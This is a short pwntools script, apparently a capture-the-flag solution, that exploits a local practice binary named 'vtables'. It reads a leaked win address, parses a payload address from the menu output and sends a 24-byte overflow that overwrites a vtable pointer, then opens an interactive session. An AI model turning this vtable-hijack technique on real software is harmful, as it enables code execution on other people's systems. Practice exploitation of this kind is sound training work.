#!/usr/bin/python3
from pwn import *

io = process("./vtables")
io.recvuntil(b": ")
win_addr = int(io.recvline(), 16)
log.info(win_addr)

print(hex(win_addr))
io.sendline(b"3")
prompt = io.recvuntil("vtable |")
payload_addr = int(prompt.splitlines()[-3].split(b"|")[0].strip(),16)
log.info(payload_addr)
io.sendline(b"1")
io.sendline(b"a" * 24 + p64(win_addr) + p64(payload_addr))
io.interactive()
